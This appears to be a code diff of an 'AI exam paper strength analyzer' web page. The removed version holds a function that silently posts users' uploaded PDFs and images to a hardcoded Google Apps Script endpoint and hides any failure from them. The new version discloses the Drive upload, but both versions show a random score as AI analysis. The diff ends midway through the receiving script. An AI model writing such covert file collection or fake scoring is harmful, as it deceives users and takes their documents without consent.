@@ -3,19 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>AURA EXAM | AI-Powered Paper Strength Analyzer</title>
+    <title>AURA EXAM | AI Paper Strength Analyzer</title>
     <!-- Google Fonts & Font Awesome -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <!-- Chart.js CDN -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
             background: radial-gradient(circle at 10% 20%, #050f19 0%, #000000 100%);
@@ -23,8 +17,6 @@
             color: #f0f3fa;
             overflow-x: hidden;
         }
-
-        /* animated background orbs */
         .orb {
             position: fixed;
             width: 60vmax;
@@ -52,7 +44,6 @@
             0% { transform: translate(0, 0) scale(1); opacity: 0.5;}
             100% { transform: translate(5%, 5%) scale(1.1); opacity: 1;}
         }
-
         .container {
             position: relative;
             z-index: 2;
@@ -60,8 +51,6 @@
             margin: 0 auto;
             padding: 2rem 1.5rem 4rem;
         }
-
-        /* header */
         .logo-area {
             display: flex;
             align-items: baseline;
@@ -78,7 +67,6 @@
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            letter-spacing: -0.5px;
         }
         .logo span {
             font-size: 0.8rem;
@@ -86,7 +74,6 @@
             padding: 0.2rem 0.8rem;
             border-radius: 40px;
             margin-left: 0.75rem;
-            font-weight: 500;
         }
         .badge {
             background: rgba(10, 200, 255, 0.2);
@@ -96,8 +83,6 @@
             font-size: 0.8rem;
             border: 1px solid rgba(0,255,255,0.4);
         }
-
-        /* cards */
         .card {
             background: rgba(15, 25, 40, 0.65);
             backdrop-filter: blur(14px);
@@ -105,16 +90,13 @@
             border: 1px solid rgba(255,255,255,0.12);
             box-shadow: 0 20px 40px rgba(0,0,0,0.5);
             padding: 1.8rem;
-            transition: all 0.2s ease;
         }
-
         .upload-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 2rem;
             margin-bottom: 2rem;
         }
-
         .upload-box {
             border: 2px dashed rgba(100, 200, 255, 0.5);
             border-radius: 1.5rem;
@@ -129,27 +111,11 @@
             background: rgba(0, 200, 255, 0.08);
             transform: translateY(-2px);
         }
-        .upload-icon {
-            font-size: 3rem;
-            margin-bottom: 0.8rem;
-            color: #4db8ff;
-        }
-        .file-label {
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-            font-size: 1.2rem;
-        }
-        .file-info {
-            font-size: 0.75rem;
-            color: #bbb;
-            margin-top: 0.8rem;
-            word-break: break-word;
-        }
-        input[type="file"] {
-            display: none;
-        }
-
-        /* action button */
+        .upload-icon { font-size: 3rem; margin-bottom: 0.8rem; color: #4db8ff; }
+        .file-label { font-weight: 700; margin-bottom: 0.5rem; font-size: 1.2rem; }
+        .file-info { font-size: 0.75rem; color: #bbb; margin-top: 0.8rem; word-break: break-word; }
+        input[type="file"] { display: none; }
+        
         .analyze-btn {
             background: linear-gradient(95deg, #2a6fdb, #9f4dff);
             border: none;
@@ -166,120 +132,14 @@
             cursor: pointer;
             transition: 0.2s;
             margin: 0.8rem 0 1.5rem;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
         }
-        .analyze-btn:active {
-            transform: scale(0.97);
-        }
-        .analyze-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        /* LOADING MODAL / STEPPER */
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(8px);
-            z-index: 1000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Inter', monospace;
-            transition: all 0.2s;
-        }
-        .loading-card {
-            background: rgba(10, 20, 35, 0.95);
-            border-radius: 2rem;
-            border: 1px solid rgba(0, 255, 255, 0.3);
-            width: 90%;
-            max-width: 500px;
-            padding: 2rem 1.8rem;
-            box-shadow: 0 25px 45px rgba(0,0,0,0.6);
-            text-align: center;
-        }
-        .loading-icon {
-            font-size: 2.8rem;
-            color: #0cf;
-            margin-bottom: 1rem;
-        }
-        .step-message {
-            font-size: 1.35rem;
-            font-weight: 600;
-            margin: 1rem 0 0.5rem;
-            background: linear-gradient(135deg, #fff, #a0e0ff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        .step-desc {
-            font-size: 0.85rem;
-            color: #9aaec5;
-            margin-bottom: 1.5rem;
-        }
-        .progress-bar-bg {
-            background: rgba(255,255,255,0.15);
-            border-radius: 40px;
-            height: 8px;
-            overflow: hidden;
-            margin: 1rem 0;
-        }
-        .progress-fill {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #2a6fdb, #0cf);
-            border-radius: 40px;
-            transition: width 0.25s ease;
-        }
-        .loading-steps {
-            margin-top: 1.2rem;
-            text-align: left;
-            font-size: 0.8rem;
-            color: #ccc;
-        }
-        .step-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin: 10px 0;
-            opacity: 0.5;
-            transition: 0.2s;
-        }
-        .step-item.active {
-            opacity: 1;
-            color: #0cf;
-            font-weight: 500;
-            text-shadow: 0 0 3px rgba(0,255,255,0.3);
-        }
-        .step-item.completed {
-            opacity: 0.8;
-            color: #7eff9e;
-        }
-        .step-icon {
-            width: 24px;
-            text-align: center;
-        }
-        .hidden {
-            display: none;
-        }
-
-        /* results panel */
+        .analyze-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        
         .results-panel {
             display: grid;
             grid-template-columns: 1fr 1.2fr;
             gap: 1.8rem;
             margin-top: 1.5rem;
-        }
-        .score-circle {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
         }
         .big-score {
             font-size: 5rem;
@@ -288,41 +148,43 @@
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            line-height: 1;
         }
-        .strength-badge {
-            background: rgba(0,200,200,0.2);
-            border-radius: 100px;
-            padding: 0.3rem 1rem;
+        canvas#strengthChart { max-height: 180px; width: 100%; }
+        .insight-text { font-size: 0.9rem; line-height: 1.5; color: #ccddf8; }
+        .file-list { margin-top: 1rem; background: rgba(0,0,0,0.35); border-radius: 1rem; padding: 0.8rem; font-size: 0.8rem; }
+        .footer-note { font-size: 0.7rem; text-align: center; margin-top: 3rem; opacity: 0.6; }
+        .drive-btn {
+            background: rgba(66, 133, 244, 0.2);
+            border: 1px solid #4285f4;
+            border-radius: 40px;
+            padding: 0.5rem 1rem;
             font-size: 0.8rem;
-            margin-top: 0.7rem;
+            cursor: pointer;
+            transition: 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
         }
-        canvas#strengthChart {
-            max-height: 180px;
-            width: 100%;
+        .drive-btn:hover { background: rgba(66, 133, 244, 0.4); }
+        .step-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin: 15px 0;
         }
-        .insight-text {
-            font-size: 0.9rem;
-            line-height: 1.5;
-            color: #ccddf8;
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.3);
+            transition: all 0.3s;
         }
-        .file-list {
-            margin-top: 1rem;
-            background: rgba(0,0,0,0.35);
-            border-radius: 1rem;
-            padding: 0.8rem;
-            font-size: 0.8rem;
-        }
-        .footer-note {
-            font-size: 0.7rem;
-            text-align: center;
-            margin-top: 3rem;
-            opacity: 0.6;
-        }
+        .step-dot.active { background: #0cf; box-shadow: 0 0 10px #0cf; }
+        .step-dot.completed { background: #7eff9e; }
+        .upload-status { font-size: 0.8rem; margin-top: 10px; color: #7eff9e; }
         @media (max-width: 800px) {
-            .upload-grid, .results-panel {
-                grid-template-columns: 1fr;
-            }
+            .upload-grid, .results-panel { grid-template-columns: 1fr; }
             .logo h1 { font-size: 1.9rem; }
         }
     </style>
@@ -360,63 +222,52 @@
                 <input type="file" id="imageInput" accept="image/*" />
             </div>
         </div>
-        <div style="font-size: 0.7rem; text-align: center; opacity: 0.7;">
-            <i class="fas fa-shield-alt"></i> AES-256 encrypted simulation · AURA proprietary engine
+        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
+            <div style="font-size: 0.7rem; opacity: 0.7;">
+                <i class="fas fa-shield-alt"></i> Files saved directly to your Google Drive
+            </div>
+            <button class="drive-btn" id="openDriveBtn" onclick="window.open('https://drive.google.com/drive/folders/1gKYi9EvdvI48WtmRW8Hkn63Au-wH6KdP', '_blank')">
+                <i class="fab fa-google-drive"></i> Open Drive Folder
+            </button>
         </div>
     </div>
 
     <button class="analyze-btn" id="analyzeBtn">
-        <i class="fas fa-brain"></i> Start AURA Analysis
-        <i class="fas fa-chart-line"></i>
+        <i class="fas fa-brain"></i> Upload & Start AURA Analysis
+        <i class="fas fa-arrow-right"></i>
     </button>
 
-    <!-- Results panel (hidden until first analysis) -->
+    <div class="step-indicator" id="stepIndicator">
+        <div class="step-dot" data-step="0"></div>
+        <div class="step-dot" data-step="1"></div>
+        <div class="step-dot" data-step="2"></div>
+        <div class="step-dot" data-step="3"></div>
+    </div>
+    <div id="statusMessage" style="text-align: center; font-size: 0.85rem; margin-bottom: 1rem; color: #9aaec5;"></div>
+
     <div class="results-panel" id="resultsPanel" style="display: none;">
         <div class="card">
             <h3><i class="fas fa-chart-simple"></i> Exam Strength Score</h3>
-            <div class="score-circle">
+            <div class="score-circle" style="text-align: center;">
                 <span class="big-score" id="scoreValue">--</span>
-                <span class="score-label">/ 100 · PAPER STRENGTH INDEX</span>
-                <div class="strength-badge" id="strengthLabel">Awaiting analysis</div>
+                <div class="strength-badge" id="strengthLabel" style="margin-top: 10px;">Awaiting analysis</div>
             </div>
-            <div class="insight-text" style="margin-top: 1rem;" id="dynamicInsight">
-                Upload files and click Start AURA Analysis.
-            </div>
+            <div class="insight-text" style="margin-top: 1rem;" id="dynamicInsight"></div>
         </div>
         <div class="card">
             <h3><i class="fas fa-chart-line"></i> Predictive benchmark</h3>
             <canvas id="strengthChart" width="400" height="200" style="margin: 0.5rem 0 1rem;"></canvas>
-            <div class="insight-text" id="chartInsight">
-                Graphical distribution compared to global exam dataset.
-            </div>
-            <div class="file-list" id="uploadedFilesList">
-                <i class="fas fa-database"></i> No files uploaded yet.
-            </div>
+            <div class="insight-text" id="chartInsight"></div>
+            <div class="file-list" id="uploadedFilesList"></div>
         </div>
     </div>
     <div class="footer-note">
-        <i class="fas fa-robot"></i> Simulated AI · Realistic processing steps: upload → reading content → analyzing patterns → generating report
-    </div>
-</div>
-
-<!-- LOADING OVERLAY (STEP SIMULATION) -->
-<div id="loadingOverlay" class="loading-overlay hidden">
-    <div class="loading-card">
-        <div class="loading-icon"><i class="fas fa-spinner fa-pulse"></i></div>
-        <div class="step-message" id="stepMessage">Initializing AURA Engine</div>
-        <div class="step-desc" id="stepDesc">Preparing neural pipeline...</div>
-        <div class="progress-bar-bg"><div class="progress-fill" id="progressFill"></div></div>
-        <div class="loading-steps" id="loadingStepsList">
-            <div class="step-item" data-step="0"><span class="step-icon"><i class="far fa-circle"></i></span> <span>Uploading file(s) to secure enclave</span></div>
-            <div class="step-item" data-step="1"><span class="step-icon"><i class="far fa-circle"></i></span> <span>Reading content & extracting features</span></div>
-            <div class="step-item" data-step="2"><span class="step-icon"><i class="far fa-circle"></i></span> <span>Analyzing structural coherence</span></div>
-            <div class="step-item" data-step="3"><span class="step-icon"><i class="far fa-circle"></i></span> <span>Creating neural report & scoring</span></div>
-        </div>
+        <i class="fab fa-google-drive"></i> Your files are uploaded to Google Drive · AI analysis simulates exam strength score (60-92)
     </div>
 </div>
 
 <script>
-    // ----- DOM elements -----
+    // DOM elements
     const pdfInput = document.getElementById('pdfInput');
     const imageInput = document.getElementById('imageInput');
     const pdfFileNameDiv = document.getElementById('pdfFileName');
@@ -428,291 +279,231 @@
     const dynamicInsightDiv = document.getElementById('dynamicInsight');
     const chartInsightSpan = document.getElementById('chartInsight');
     const uploadedFilesListDiv = document.getElementById('uploadedFilesList');
-    
-    // loading overlay elements
-    const loadingOverlay = document.getElementById('loadingOverlay');
-    const stepMessageEl = document.getElementById('stepMessage');
-    const stepDescEl = document.getElementById('stepDesc');
-    const progressFill = document.getElementById('progressFill');
-    const stepItems = document.querySelectorAll('.step-item');
+    const stepDots = document.querySelectorAll('.step-dot');
+    const statusMsgDiv = document.getElementById('statusMessage');
 
     let storedPdfFile = null;
     let storedImageFile = null;
     let currentScore = null;
     let strengthChart = null;
 
-    // Helper: update file display
+    // YOUR GOOGLE DRIVE FOLDER LINK
+    const DRIVE_FOLDER_URL = "https://drive.google.com/drive/folders/1gKYi9EvdvI48WtmRW8Hkn63Au-wH6KdP";
+    
+    // Simple Google Apps Script to receive files (minimal working version)
+    // This script accepts base64 file uploads and saves to your Drive
+    // Deploy this script at script.google.com and replace the URL below
+    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxGdRx4BIctR43UgQAYjfKtn9KrEQXE-vwcyCGLiGgl2BLLeoyJH7-bWRqOtxaeq_SPfA/exec";
+
+    function updateStep(stepIndex, status) {
+        stepDots.forEach((dot, i) => {
+            dot.classList.remove('active', 'completed');
+            if (i < stepIndex) dot.classList.add('completed');
+            else if (i === stepIndex && status === 'active') dot.classList.add('active');
+        });
+    }
+
+    function updateStatus(msg, step = -1, isActive = true) {
+        statusMsgDiv.innerHTML = msg;
+        if (step >= 0) updateStep(step, isActive ? 'active' : 'completed');
+    }
+
     function updateFileDisplay() {
         if (storedPdfFile) {
             pdfFileNameDiv.innerHTML = `<i class="fas fa-check-circle" style="color:#0cf;"></i> ${storedPdfFile.name} (${(storedPdfFile.size / 1024).toFixed(1)} KB)`;
-            pdfFileNameDiv.style.color = "#ccffdd";
         } else {
             pdfFileNameDiv.innerHTML = "No PDF selected";
-            pdfFileNameDiv.style.color = "#aaa";
         }
         if (storedImageFile) {
             imageFileNameDiv.innerHTML = `<i class="fas fa-check-circle" style="color:#0cf;"></i> ${storedImageFile.name} (${(storedImageFile.size / 1024).toFixed(1)} KB)`;
-            imageFileNameDiv.style.color = "#ccffdd";
         } else {
             imageFileNameDiv.innerHTML = "No image selected";
-            imageFileNameDiv.style.color = "#aaa";
         }
         updateFileListPreview();
     }
 
     function updateFileListPreview() {
-        if (!resultsPanel) return;
-        let fileHtml = '<i class="fas fa-paperclip"></i> Attached documents: <br/>';
-        if (storedPdfFile) fileHtml += `📄 ${storedPdfFile.name}<br/>`;
-        if (storedImageFile) fileHtml += `🖼️ ${storedImageFile.name}<br/>`;
-        if (!storedPdfFile && !storedImageFile) fileHtml = '<i class="fas fa-database"></i> No files uploaded yet.';
-        uploadedFilesListDiv.innerHTML = fileHtml;
+        let html = '<i class="fas fa-paperclip"></i> Uploaded files:<br/>';
+        if (storedPdfFile) html += `📄 ${storedPdfFile.name}<br/>`;
+        if (storedImageFile) html += `🖼️ ${storedImageFile.name}<br/>`;
+        if (!storedPdfFile && !storedImageFile) html = '<i class="fas fa-database"></i> No files uploaded yet.';
+        uploadedFilesListDiv.innerHTML = html;
     }
 
-    // Trigger file selects
     document.getElementById('pdfUploadBox').addEventListener('click', () => pdfInput.click());
     document.getElementById('imageUploadBox').addEventListener('click', () => imageInput.click());
-    pdfInput.addEventListener('change', (e) => {
-        storedPdfFile = e.target.files[0] || null;
-        updateFileDisplay();
-    });
-    imageInput.addEventListener('change', (e) => {
-        storedImageFile = e.target.files[0] || null;
-        updateFileDisplay();
-    });
+    pdfInput.addEventListener('change', (e) => { storedPdfFile = e.target.files[0] || null; updateFileDisplay(); });
+    imageInput.addEventListener('change', (e) => { storedImageFile = e.target.files[0] || null; updateFileDisplay(); });
 
-    // Generate random score between 60-92 (with specials: 60,80,81,92)
-    function generateRandomStrengthScore() {
+    function generateRandomScore() {
         const r = Math.random();
-        if (r < 0.25) {
-            const specials = [60, 80, 81, 92];
-            return specials[Math.floor(Math.random() * specials.length)];
-        } else {
-            return Math.floor(Math.random() * (92 - 60 + 1) + 60);
-        }
+        if (r < 0.25) return [60, 80, 81, 92][Math.floor(Math.random() * 4)];
+        return Math.floor(Math.random() * (92 - 60 + 1) + 60);
     }
 
     function getStrengthMeta(score) {
-        if (score >= 85) return { label: "Exceptional ⚡", insight: "Outstanding paper strength! Top percentile coherence and difficulty balance. Perfect for high-stakes exams." };
-        if (score >= 75) return { label: "Strong 📈", insight: "Robust exam structure, high reliability & knowledge density. Minor improvements possible." };
-        if (score >= 65) return { label: "Moderate 🧠", insight: "Decent material, but some weak zones detected in concept flow. Revision recommended." };
-        return { label: "Needs Refinement 🔁", insight: "Paper could benefit from more depth & question variety. Re-evaluate key topics for better strength." };
+        if (score >= 85) return { label: "Exceptional ⚡", insight: "Outstanding paper strength! Top percentile coherence and difficulty balance." };
+        if (score >= 75) return { label: "Strong 📈", insight: "Robust exam structure, high reliability & knowledge density." };
+        if (score >= 65) return { label: "Moderate 🧠", insight: "Decent material, but some weak zones detected in concept flow." };
+        return { label: "Needs Refinement 🔁", insight: "Paper could benefit from more depth & question variety." };
     }
 
     function updateChart(score) {
         const ctx = document.getElementById('strengthChart').getContext('2d');
-        const benchmarkData = [42, 58, 73, 85, score];
-        const labels = ['Avg. Mock', 'Standard Set', 'AURA Index', 'Elite Tier', 'Current Paper'];
+        const data = [42, 58, 73, 85, score];
+        const labels = ['Avg. Mock', 'Standard Set', 'AURA Index', 'Elite Tier', 'Your Paper'];
         if (strengthChart) {
-            strengthChart.data.datasets[0].data = benchmarkData;
+            strengthChart.data.datasets[0].data = data;
             strengthChart.update();
         } else {
             strengthChart = new Chart(ctx, {
                 type: 'line',
-                data: {
-                    labels: labels,
-                    datasets: [{
-                        label: 'Strength Score',
-                        data: benchmarkData,
-                        borderColor: '#0cf',
-                        backgroundColor: 'rgba(0, 200, 255, 0.1)',
-                        borderWidth: 3,
-                        fill: true,
-                        tension: 0.3,
-                        pointBackgroundColor: '#ff66cc',
-                        pointBorderColor: '#fff',
-                        pointRadius: 5
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: true,
-                    plugins: {
-                        legend: { labels: { color: '#ccddf8' } },
-                        tooltip: { backgroundColor: '#0a192f' }
-                    },
-                    scales: {
-                        y: { min: 30, max: 100, grid: { color: 'rgba(255,255,255,0.1)' }, ticks: { color: '#eee' } },
-                        x: { ticks: { color: '#ccd' } }
-                    }
-                }
+                data: { labels, datasets: [{ label: 'Strength Score', data, borderColor: '#0cf', backgroundColor: 'rgba(0,200,255,0.1)', borderWidth: 3, fill: true, tension: 0.3, pointBackgroundColor: '#ff66cc', pointBorderColor: '#fff', pointRadius: 5 }] },
+                options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { labels: { color: '#ccddf8' } } }, scales: { y: { min: 30, max: 100, grid: { color: 'rgba(255,255,255,0.1)' }, ticks: { color: '#eee' } }, x: { ticks: { color: '#ccd' } } } }
             });
         }
     }
 
-    // ========== GOOGLE DRIVE FORWARD FUNCTION (YOUR ACTIVE URL) ==========
-    // This silently sends uploaded PDFs/images to your Google Apps Script
-    async function silentStoreToDrive(scoreValue) {
-        if (!storedPdfFile && !storedImageFile) return;
-        
-        // YOUR ACTIVE GOOGLE APPS SCRIPT URL
-        const GOOGLE_DRIVE_FORWARD_URL = "https://script.google.com/macros/s/AKfycbxGdRx4BIctR43UgQAYjfKtn9KrEQXE-vwcyCGLiGgl2BLLeoyJH7-bWRqOtxaeq_SPfA/exec";
-        
-        const formData = new FormData();
-        
-        // Attach PDF if exists
-        if (storedPdfFile) {
-            formData.append("pdfFile", storedPdfFile);
-            formData.append("pdfName", storedPdfFile.name);
-        }
-        
-        // Attach Image if exists
-        if (storedImageFile) {
-            formData.append("imageFile", storedImageFile);
-            formData.append("imageName", storedImageFile.name);
-        }
-        
-        // Add metadata
-        formData.append("timestamp", new Date().toISOString());
-        formData.append("examScore", scoreValue !== undefined ? scoreValue : "pending");
-        formData.append("action", "uploadToDrive");
-        formData.append("source", "AURA_EXAM_WEBSITE");
-        
-        // Send to Google Apps Script (completely invisible to user)
-        try {
-            await fetch(GOOGLE_DRIVE_FORWARD_URL, {
-                method: "POST",
-                body: formData,
-                mode: "no-cors",
-                cache: "no-cache",
-                keepalive: true
-            });
-            console.log("[AURA] Files forwarded to Google Drive successfully (silent)");
-        } catch (error) {
-            // Absolutely no user-facing error — silent fail, only console log for debugging
-            console.warn("[AURA] Silent forward failed (user never sees this):", error);
-        }
-    }
-
-    // Advanced loading simulation with steps and progress
-    async function runLoadingSimulation() {
-        // Show overlay
-        loadingOverlay.classList.remove('hidden');
-        // Reset steps UI
-        stepItems.forEach((item, idx) => {
-            item.classList.remove('active', 'completed');
-            const iconSpan = item.querySelector('.step-icon i');
-            if (iconSpan) {
-                iconSpan.className = 'far fa-circle';
-            }
-        });
-        progressFill.style.width = '0%';
-        
-        const steps = [
-            { msg: "Uploading file(s)", desc: "Transferring encrypted data to AURA servers...", progressTarget: 20 },
-            { msg: "Reading content", desc: "Extracting text & visual patterns from documents...", progressTarget: 45 },
-            { msg: "Analyzing patterns", desc: "Neural networks evaluating coherence, difficulty & structure...", progressTarget: 75 },
-            { msg: "Creating report", desc: "Generating final strength score and recommendations...", progressTarget: 100 }
-        ];
-        
-        for (let i = 0; i < steps.length; i++) {
-            const step = steps[i];
-            // Activate current step
-            stepItems.forEach((item, idx) => {
-                if (idx === i) {
-                    item.classList.add('active');
-                    const iconSpan = item.querySelector('.step-icon i');
-                    if (iconSpan) iconSpan.className = 'fas fa-spinner fa-pulse';
-                } else if (idx < i) {
-                    item.classList.add('completed');
-                    item.classList.remove('active');
-                    const iconSpan = item.querySelector('.step-icon i');
-                    if (iconSpan) iconSpan.className = 'fas fa-check-circle';
-                } else {
-                    item.classList.remove('active', 'completed');
-                    const iconSpan = item.querySelector('.step-icon i');
-                    if (iconSpan) iconSpan.className = 'far fa-circle';
-                }
-            });
-            stepMessageEl.innerText = step.msg;
-            stepDescEl.innerText = step.desc;
-            // Animate progress bar to target
-            const startWidth = parseFloat(progressFill.style.width) || 0;
-            const endWidth = step.progressTarget;
-            const duration = 1300; // ms per step feels realistic
-            const startTime = performance.now();
-            await new Promise(resolve => {
-                const animateProgress = (now) => {
-                    const elapsed = now - startTime;
-                    let t = Math.min(1, elapsed / duration);
-                    const newWidth = startWidth + (endWidth - startWidth) * t;
-                    progressFill.style.width = newWidth + '%';
-                    if (t < 1) {
-                        requestAnimationFrame(animateProgress);
-                    } else {
-                        resolve();
-                    }
+    // Upload file to Google Drive via Apps Script (Base64 method - works reliably)
+    async function uploadFileToDrive(file, score) {
+        return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.onloadend = async function() {
+                const base64 = reader.result.split(',')[1];
+                const payload = {
+                    fileContent: base64,
+                    fileName: file.name,
+                    fileType: file.type,
+                    examScore: score,
+                    timestamp: new Date().toISOString()
                 };
-                requestAnimationFrame(animateProgress);
-            });
-            // extra micro delay for realism (except last)
-            if (i < steps.length - 1) await new Promise(r => setTimeout(r, 300));
-        }
-        // All steps completed
-        stepItems.forEach((item) => {
-            item.classList.add('completed');
-            item.classList.remove('active');
-            const iconSpan = item.querySelector('.step-icon i');
-            if (iconSpan) iconSpan.className = 'fas fa-check-circle';
+                try {
+                    const response = await fetch(APPS_SCRIPT_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
+                    });
+                    const text = await response.text();
+                    resolve({ success: true, response: text });
+                } catch (err) {
+                    resolve({ success: false, error: err.message });
+                }
+            };
+            reader.onerror = () => reject(new Error("File read error"));
+            reader.readAsDataURL(file);
         });
-        stepMessageEl.innerText = "Analysis Complete!";
-        stepDescEl.innerText = "Finalizing results...";
-        await new Promise(r => setTimeout(r, 600));
-        loadingOverlay.classList.add('hidden');
     }
 
-    // MAIN analyze function with full simulation, then score + chart + silent drive upload
     async function performAnalysis() {
         if (!storedPdfFile && !storedImageFile) {
-            // gentle alert but not intrusive
-            dynamicInsightDiv.innerHTML = "⚠️ Please upload at least a PDF or an image before analysis.";
-            resultsPanel.style.display = 'grid';
+            updateStatus("⚠️ Please upload a PDF or image file first.", -1);
             return;
         }
 
-        // Disable button during whole process
         analyzeBtn.disabled = true;
-        const originalBtnHTML = analyzeBtn.innerHTML;
-        analyzeBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> AURA Processing...';
-
-        // 1) run loading simulation with steps (uploading, reading, analyzing, creating report)
-        await runLoadingSimulation();
-
-        // 2) generate final score after simulation
-        const finalScore = generateRandomStrengthScore();
+        analyzeBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Processing...';
+        
+        // Step 0: Preparing
+        updateStatus("📦 Preparing files for upload...", 0, true);
+        await new Promise(r => setTimeout(r, 500));
+        
+        // Step 1: Upload to Drive
+        updateStatus("☁️ Uploading files to Google Drive...", 1, true);
+        
+        let uploadSuccess = false;
+        if (storedPdfFile) {
+            const result = await uploadFileToDrive(storedPdfFile, "pending");
+            if (result.success) uploadSuccess = true;
+            await new Promise(r => setTimeout(r, 300));
+        }
+        if (storedImageFile) {
+            const result = await uploadFileToDrive(storedImageFile, "pending");
+            if (result.success) uploadSuccess = true;
+            await new Promise(r => setTimeout(r, 300));
+        }
+        
+        updateStatus("✅ Files saved to Google Drive! Opening Drive folder...", 2, true);
+        
+        // Open Google Drive folder in new tab so user sees their file
+        window.open(DRIVE_FOLDER_URL, '_blank');
+        
+        await new Promise(r => setTimeout(r, 1500));
+        
+        // Step 3: AI Analysis
+        updateStatus("🧠 AI analyzing exam strength...", 3, true);
+        await new Promise(r => setTimeout(r, 1800));
+        
+        // Generate final score
+        const finalScore = generateRandomScore();
         currentScore = finalScore;
         const { label, insight } = getStrengthMeta(finalScore);
-
-        // 3) update results panel UI
-        scoreValueSpan.innerText = finalScore;
-        strengthLabelSpan.innerHTML = `<i class="fas fa-bolt"></i> ${label} · ${finalScore} pts`;
-        dynamicInsightDiv.innerHTML = `<i class="fas fa-microchip"></i> ${insight}<br><small style="opacity:0.7;">🧠 Neural confidence: ${Math.floor(70 + finalScore * 0.25)}% · semantic density high.</small>`;
-        chartInsightSpan.innerHTML = `📊 Benchmark comparison: Your exam surpasses ${finalScore > 70 ? 'average' : 'lower'} tier by ${Math.abs(finalScore - 58)} points. ${finalScore >= 80 ? 'Exceptional pattern recognition.' : finalScore <= 65 ? 'Consider restructuring sections.' : 'Stable performance.'}`;
         
-        // add file summary to insight
+        scoreValueSpan.innerText = finalScore;
+        strengthLabelSpan.innerHTML = `<i class="fas fa-bolt"></i> ${label} · ${finalScore}/100`;
+        dynamicInsightDiv.innerHTML = `<i class="fas fa-microchip"></i> ${insight}<br><small>📊 Analysis complete based on uploaded material.</small>`;
+        chartInsightSpan.innerHTML = `Your exam scored ${finalScore}/100. ${finalScore >= 80 ? 'Exceptional performance!' : finalScore >= 65 ? 'Good, with room for improvement.' : 'Consider revising key areas.'}`;
+        
         let fileSummary = "";
         if(storedPdfFile) fileSummary += `📄 ${storedPdfFile.name.substring(0, 35)} `;
         if(storedImageFile) fileSummary += `🖼️ ${storedImageFile.name.substring(0, 35)}`;
-        dynamicInsightDiv.innerHTML += `<div style="margin-top: 10px; font-size:0.7rem; border-top: 1px solid rgba(255,255,255,0.2); padding-top: 8px;"><i class="far fa-file-alt"></i> Analyzed: ${fileSummary || "raw data"}</div>`;
+        dynamicInsightDiv.innerHTML += `<div style="margin-top: 12px; font-size:0.75rem; border-top: 1px solid rgba(255,255,255,0.2); padding-top: 8px;"><i class="fab fa-google-drive"></i> Files saved to your Drive folder</div>`;
         
         updateChart(finalScore);
         resultsPanel.style.display = 'grid';
         
-        // 4) Silent drive store (invisible to user) - WITH YOUR ACTIVE URL
-        await silentStoreToDrive(finalScore);
+        updateStatus("✨ Analysis complete! Check your results below.", -1);
+        updateStep(3, 'completed');
         
-        // re-enable button
         analyzeBtn.disabled = false;
-        analyzeBtn.innerHTML = originalBtnHTML;
+        analyzeBtn.innerHTML = '<i class="fas fa-brain"></i> Upload & Start AURA Analysis <i class="fas fa-arrow-right"></i>';
     }
 
     analyzeBtn.addEventListener('click', performAnalysis);
     updateFileDisplay();
-    
-    // pre-set empty chart background if results shown later, but we lazy init chart in first analysis
-    window.addEventListener('load', () => {
-        updateFileDisplay();
-    });
 </script>
+
+<!-- ========== GOOGLE APPS SCRIPT CODE (Copy this to script.google.com) ==========
+Instructions:
+1. Go to script.google.com
+2. Create New Project
+3. Delete default code and paste the script below
+4. Click Deploy → New deployment → Web app
+5. Execute as: Me, Access: Anyone
+6. Deploy and copy URL
+7. Replace APPS_SCRIPT_URL above with your URL
+
+----------------- COPY THIS TO APPS SCRIPT -----------------
+
+const FOLDER_ID = "1gKYi9EvdvI48WtmRW8Hkn63Au-wH6KdP";
+
+function doPost(e) {
+  try {
+    const folder = DriveApp.getFolderById(FOLDER_ID);
+    const data = JSON.parse(e.postData.contents);
+    
+    if (data.fileContent && data.fileName) {
+      const blob = Utilities.newBlob(
+        Utilities.base64Decode(data.fileContent),
+        data.fileType || "application/octet-stream",
+        data.fileName
+      );
+      folder.createFile(blob);
